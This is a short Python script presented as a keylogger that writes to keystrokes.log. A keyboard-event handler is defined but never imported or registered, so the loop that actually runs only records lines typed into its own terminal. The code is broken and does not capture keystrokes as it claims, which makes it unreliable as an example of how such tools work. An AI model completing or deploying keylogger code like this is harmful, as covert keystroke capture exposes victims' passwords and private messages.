log_file = "keystrokes.log"

def on_key_event(event):
    key = event.name
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\n"
        else:
            key = f"[{key.upper()}]"
    with open(log_file, "a") as f:
        f.write(key)

print("Keylogger started. Press 'esc' to stop.")

while True:
    try:
        key = input()  # Wait for input (keystrokes)
        if key == "esc":
            print("Keylogger stopped.")
            break
        else:
            with open(log_file, "a") as f:
                f.write(key)
    except KeyboardInterrupt:
        break